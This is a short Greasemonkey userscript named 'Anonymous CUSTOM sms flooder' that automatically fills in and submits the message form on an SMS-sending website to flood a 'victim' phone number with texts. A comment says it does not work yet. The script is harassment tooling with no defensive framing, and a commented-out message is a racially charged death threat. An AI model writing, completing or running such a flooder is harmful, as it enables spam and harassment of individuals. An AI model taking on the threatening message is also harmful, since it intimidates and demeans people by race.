// ==UserScript==
// @name          Anonymous CUSTOM sms flooder
// @namespace     Yash
// @description   flooder sms
// @include       http://*sms.urbuddy.com/*
// ==/UserScript==


//NOT WORKING YET, WILL EDIT IT SOON




var victim=0; //17122982137
var msg="FLOODING CHALU HAI"; // YoU wIlL dIe ToNiGhT wHiTe BoY yOu GoIn To FeEl FiRe ToNiGhT wHiTe BoY
// ********   130 letters maximun   **********


if(document.location=="http://sms.urbuddy.com/")
{
document.getElementsByTagName("textarea")[0].value=msg;
document.getElementsByTagName("input")[3].value=victim;
document.forms[1].submit();void(0);
}